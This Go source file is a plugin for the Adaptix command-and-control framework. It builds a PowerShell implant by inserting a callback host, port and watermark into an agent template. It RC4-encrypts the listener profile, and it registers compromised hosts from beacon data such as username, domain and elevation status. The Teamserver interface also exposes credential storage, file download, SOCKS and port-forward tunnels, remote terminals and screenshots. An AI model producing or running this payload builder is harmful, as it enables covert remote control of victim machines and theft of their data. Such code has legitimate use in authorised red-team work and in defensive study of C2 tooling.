package main

import (
	"encoding/json"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"os"
	"strconv"
	"strings"

	"github.com/Adaptix-Framework/axc2"
)

type Teamserver interface {
	TsAgentIsExists(agentId string) bool
	TsAgentCreate(agentCrc string, agentId string, beat []byte, listenerName string, ExternalIP string, Async bool) (adaptix.AgentData, error)
	TsAgentProcessData(agentId string, bodyData []byte) error
	TsAgentUpdateData(newAgentData adaptix.AgentData) error
	TsAgentTerminate(agentId string, terminateTaskId string) error

	TsAgentUpdateDataPartial(agentId string, updateData interface{}) error
	TsAgentSetTick(agentId string, listenerName string) error

	TsAgentConsoleOutput(agentId string, messageType int, message string, clearText string, store bool)

	TsAgentGetHostedAll(agentId string, maxDataSize int) ([]byte, error)
	TsAgentGetHostedTasks(agentId string, maxDataSize int) ([]byte, error)
	TsAgentGetHostedTasksCount(agentId string, count int, maxDataSize int) ([]byte, error)

	TsTaskRunningExists(agentId string, taskId string) bool
	TsTaskCreate(agentId string, cmdline string, client string, taskData adaptix.TaskData)
	TsTaskUpdate(agentId string, updateData adaptix.TaskData)

	TsTaskGetAvailableAll(agentId string, availableSize int) ([]adaptix.TaskData, error)
	TsTaskGetAvailableTasks(agentId string, availableSize int) ([]adaptix.TaskData, int, error)
	TsTaskGetAvailableTasksCount(agentId string, maxCount int, availableSize int) ([]adaptix.TaskData, int, error)
	TsTasksPivotExists(agentId string, first bool) bool
	TsTaskGetAvailablePivotAll(agentId string, availableSize int) ([]adaptix.TaskData, error)

	TsClientGuiDisksWindows(taskData adaptix.TaskData, drives []adaptix.ListingDrivesDataWin)
	TsClientGuiFilesStatus(taskData adaptix.TaskData)
	TsClientGuiFilesWindows(taskData adaptix.TaskData, path string, files []adaptix.ListingFileDataWin)
	TsClientGuiFilesUnix(taskData adaptix.TaskData, path string, files []adaptix.ListingFileDataUnix)
	TsClientGuiProcessWindows(taskData adaptix.TaskData, process []adaptix.ListingProcessDataWin)
	TsClientGuiProcessUnix(taskData adaptix.TaskData, process []adaptix.ListingProcessDataUnix)

	TsCredentilsAdd(creds []map[string]interface{}) error
	TsCredentilsEdit(credId string, username string, password string, realm string, credType string, tag string, storage string, host string) error
	TsCredentialsSetTag(credsId []string, tag string) error
	TsCredentilsDelete(credsId []string) error

	TsDownloadAdd(agentId string, fileId string, fileName string, fileSize int64) error
	TsDownloadUpdate(fileId string, state int, data []byte) error
	TsDownloadClose(fileId string, reason int) error
	TsDownloadSave(agentId string, fileId string, filename string, content []byte) error
	TsDownloadGetFilepath(fileId string) (string, error)
	TsUploadGetFilepath(fileId string) (string, error)
	TsUploadGetFileContent(fileId string) ([]byte, error)

	TsListenerInteralHandler(watermark string, data []byte) (string, error)

	TsGetPivotInfoByName(pivotName string) (string, string, string)
	TsGetPivotInfoById(pivotId string) (string, string, string)
	TsGetPivotByName(pivotName string) *adaptix.PivotData
	TsGetPivotById(pivotId string) *adaptix.PivotData
	TsPivotCreate(pivotId string, pAgentId string, chAgentId string, pivotName string, isRestore bool) error
	TsPivotDelete(pivotId string) error

	TsScreenshotAdd(agentId string, Note string, Content []byte) error
	TsScreenshotNote(screenId string, note string) error
	TsScreenshotDelete(screenId string) error

	TsTargetsAdd(targets []map[string]interface{}) error
	TsTargetsCreateAlive(agentData adaptix.AgentData) (string, error)
	TsTargetsEdit(targetId string, computer string, domain string, address string, os int, osDesk string, tag string, info string, alive bool) error
	TsTargetSetTag(targetsId []string, tag string) error
	TsTargetRemoveSessions(agentsId []string) error
	TsTargetDelete(targetsId []string) error

	TsTunnelStart(TunnelId string) (string, error)
	TsTunnelCreateSocks4(AgentId string, Info string, Lhost string, Lport int) (string, error)
	TsTunnelCreateSocks5(AgentId string, Info string, Lhost string, Lport int, UseAuth bool, Username string, Password string) (string, error)
	TsTunnelCreateLportfwd(AgentId string, Info string, Lhost string, Lport int, Thost string, Tport int) (string, error)
	TsTunnelCreateRportfwd(AgentId string, Info string, Lport int, Thost string, Tport int) (string, error)
	TsTunnelUpdateRportfwd(tunnelId int, result bool) (string, string, error)

	TsTunnelStopSocks(AgentId string, Port int)
	TsTunnelStopLportfwd(AgentId string, Port int)
	TsTunnelStopRportfwd(AgentId string, Port int)

	TsTunnelConnectionClose(channelId int, writeOnly bool)
	TsTunnelConnectionHalt(channelId int, errorCode byte)
	TsTunnelConnectionResume(AgentId string, channelId int, ioDirect bool)
	TsTunnelConnectionData(channelId int, data []byte)
	TsTunnelConnectionAccept(tunnelId int, channelId int)
	TsTunnelPause(channelId int)
	TsTunnelResume(channelId int)

	TsTerminalConnExists(terminalId string) bool
	TsTerminalGetPipe(AgentId string, terminalId string) (*io.PipeReader, *io.PipeWriter, error)
	TsTerminalConnResume(agentId string, terminalId string, ioDirect bool)
	TsTerminalConnData(terminalId string, data []byte)
	TsTerminalConnClose(terminalId string, status string) error

	TsConvertCpToUTF8(input string, codePage int) string
	TsConvertUTF8toCp(input string, codePage int) string
	TsWin32Error(errorCode uint) string
}

type PluginAgent struct{}

type ExtenderAgent struct{}

var (
	Ts             Teamserver
	ModuleDir      string
	AgentWatermark string
)

func InitPlugin(ts any, moduleDir string, watermark string) adaptix.PluginAgent {
	ModuleDir = moduleDir
	AgentWatermark = watermark
	Ts = ts.(Teamserver)
	return &PluginAgent{}
}

func (p *PluginAgent) GetExtender() adaptix.ExtenderAgent {
	return &ExtenderAgent{}
}

func makeProxyTask(packData []byte) adaptix.TaskData {
	return adaptix.TaskData{Type: adaptix.TASK_TYPE_PROXY_DATA, Data: packData, Sync: false}
}

func getStringArg(args map[string]any, key string) (string, error) {
	v, ok := args[key].(string)
	if !ok {
		return "", fmt.Errorf("parameter '%s' must be set", key)
	}
	return v, nil
}

func getFloatArg(args map[string]any, key string) (float64, error) {
	v, ok := args[key].(float64)
	if !ok {
		return 0, fmt.Errorf("parameter '%s' must be set", key)
	}
	return v, nil
}

func getBoolArg(args map[string]any, key string) bool {
	v, _ := args[key].(bool)
	return v
}

////// PLUGIN AGENT

type GenerateConfig struct {
	HostBind		string	`json:"host_bind"`
	PortBind		int		`json:"port_bind"`
	CallbackAddress	string	`json:"callback_address"`
	EncryptKey		string	`json:"encrypt_key"`
}

// GenerateProfiles extracts listener configuration needed for agent generation.
// This function is called during agent build to gather connection parameters.
func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, error) {
	var agentProfiles [][]byte

	for _, transportProfile := range profile.ListenerProfiles {

		// var listenerMap map[string]any
		// if err := json.Unmarshal(transportProfile.Profile, &listenerMap); err != nil {
		// 	return nil, err
		// }

		/// START CODE HERE

		var (
			generateConfig	GenerateConfig
			params			[]interface{}
		)

		err := json.Unmarshal([]byte(transportProfile.Profile), &generateConfig)
		if err != nil {
			return nil, err
		}

		agentWatermark, err := strconv.ParseInt(AgentWatermark, 16, 64)
		if err != nil {
			return nil, err
		}

		lWatermark, _ := strconv.ParseInt(transportProfile.Watermark, 16, 64)
		encryptKey, err := hex.DecodeString(generateConfig.EncryptKey)
		if err != nil {
			return nil, err
		}

		params = append(params, int(agentWatermark))
		params = append(params, int(lWatermark))
		params = append(params, generateConfig.CallbackAddress)

		packedParams, err := PackArray(params)
		if err != nil {
			return nil, err
		}

		cryptParams, err := RC4Crypt(packedParams, encryptKey)
		if err != nil {
			return nil, err
		}

		profileArray := []interface{}{len(cryptParams), cryptParams, encryptKey}
		packedProfile,err := PackArray(profileArray)
		if err != nil {
			return nil, err
		}

		profileString := ""
		for _, b := range packedProfile {
			profileString += fmt.Sprintf("\\x%02x", b)
		}

		agentProfiles = append(agentProfiles, []byte(profileString))

		/// END CODE HERE
	}
	return agentProfiles, nil
}

// BuildPaylooad creates a deployable agent by replacing placeholders in the template.
func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [][]byte) ([]byte, string, error) {
	var (
		Filename string
		Payload  []byte
	)

	/// START CODE HERE

	var generateConfig GenerateConfig

	err := json.Unmarshal([]byte(profile.ListenerProfiles[0].Profile), &generateConfig)
	if err != nil {
		return nil, "", err
	}

	// Get the required connection parameters
	callbackAddress := strings.TrimSpace(generateConfig.CallbackAddress)

	if callbackAddress == "" {
		return nil, "", fmt.Errorf(
			"callback_address is empty; AgentConfig=%q ListenerProfiles=%d",
			profile.AgentConfig,
		)
	}
	
	callbackHost, callbackPort, err := net.SplitHostPort(callbackAddress)
	if err != nil {
		return nil, "", fmt.Errorf(
			"invalid callback_address=%q: %w; AgentConfig=%q",
			callbackAddress,
			err,
			profile.AgentConfig,
		)
	}
	
	// Building the agent
	currentDir := ModuleDir
	Filename	= "agent.ps1"

	agentContentBytes, err := os.ReadFile(currentDir + "/src_papershell/agent.ps1")
	if err != nil {
		return nil, "", err
	}

	agentContent := string(agentContentBytes)

	agentContent = strings.ReplaceAll(agentContent, "<CALLBACK_HOST>", callbackHost)
	agentContent = strings.ReplaceAll(agentContent, "<CALLBACK_PORT>", callbackPort)
	agentContent = strings.ReplaceAll(agentContent, "<WATERMARK>", AgentWatermark)

	Payload = []byte(agentContent)

	/// END CODE HERE

	return Payload, Filename, nil
}

type InitialData struct {
	Domain			string	`json:"domain"`
	Username		string	`json:"username"`
	Computer		string	`json:"computer"`
	InternalIP		string	`json:"internal_ip"`
	ACP				int		`json:"acp"`
	OemCP			int		`json:"oemcp"`
	GmtOffset		int		`json:"gmt_offset"`
	Pid				int		`json:"pid"`
	Tid				int		`json:"tid"`
	BuildNumber		uint		`json:"build_number"`
	MajorVersion	uint8		`json:"major_version"`
	MinorVersion	uint8		`json:"minor_version"`
	Flag			int		`json:"flag"`
	ProcessName		string	`json:"process_name"`
}

// CreateAgent parses initial beacon data and populates agent metadata.
// Called when an agent checks in for the first time to register it in the C2.
func (p *PluginAgent) CreateAgent(beat []byte) (adaptix.AgentData, adaptix.ExtenderAgent, error) {
	var agentData adaptix.AgentData

	/// START CODE HERE

	var parsedData InitialData
	err := json.Unmarshal(beat, &parsedData)
	if err != nil {
		return agentData, &ExtenderAgent{}, nil
	}

	agentData.Domain		= parsedData.Domain
	agentData.Username		= parsedData.Username
	agentData.Computer		= parsedData.Computer
	agentData.InternalIP	= parsedData.InternalIP
	agentData.Pid			= strconv.Itoa(parsedData.Pid)
	agentData.Tid			= strconv.Itoa(parsedData.Tid)
	agentData.Process 		= parsedData.ProcessName

	agentData.Arch = "x32"
	if (parsedData.Flag & 0b00000001) > 0 {
		agentData.Arch = "x64"
	}

	systemArch := "x32"
	if (parsedData.Flag & 0b00000010) > 0 {
		systemArch = "x64"
	}

	agentData.Elevated = false
	if (parsedData.Flag & 0b00000100) > 0 {
		agentData.Elevated = true
	}

	isServer := false
	if (parsedData.Flag & 0b00001000) > 0 {
		isServer = true
	}

	agentData.Os, agentData.OsDesc = GetOsVersion(parsedData.MajorVersion, parsedData.MinorVersion, parsedData.BuildNumber, isServer, systemArch)

	/// END CODE

	return agentData, &ExtenderAgent{}, nil
}